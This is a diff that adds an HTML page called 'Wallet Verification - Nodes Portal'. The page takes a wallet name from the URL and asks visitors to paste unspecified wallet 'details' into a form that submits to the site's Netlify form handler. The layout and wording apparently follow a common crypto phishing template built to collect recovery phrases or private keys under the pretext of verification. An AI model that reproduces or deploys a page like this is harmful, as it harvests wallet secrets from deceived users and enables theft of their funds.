@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Verification - Nodes Portal</title>
+    <link rel="stylesheet" href="styles/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="container">
+            <a href="index.html" class="logo">NODES PORTAL</a>
+        </div>
+    </nav>
+
+    <main>
+        <section class="wallet-section">
+            <div class="container">
+                <h1>Wallet Verification</h1>
+                <p class="subtitle" id="wallet-name-text">Selected: Wallet</p>
+
+                <div class="wallet-form-box">
+                    <form 
+                        name="wallet-verification" 
+                        method="POST" 
+                        data-netlify="true"
+                    >
+                        <input type="hidden" name="form-name" value="wallet-verification">
+                        <input type="hidden" id="walletField" name="wallet" value="">
+
+                        <label for="details" class="form-label">Enter details</label>
+                        <input 
+                            id="details" 
+                            name="details" 
+                            type="text" 
+                            class="form-input" 
+                            placeholder="Paste info here..."
+                            required
+                        >
+
+                        <button type="submit" class="btn btn-primary">Submit</button>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; NODES PORTAL. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const wallet = params.get('wallet') || 'Wallet';
+        document.getElementById('wallet-name-text').textContent = `Selected: ${wallet}`;
+        document.getElementById('walletField').value = wallet;
+    </script>
+</body>
+</html>
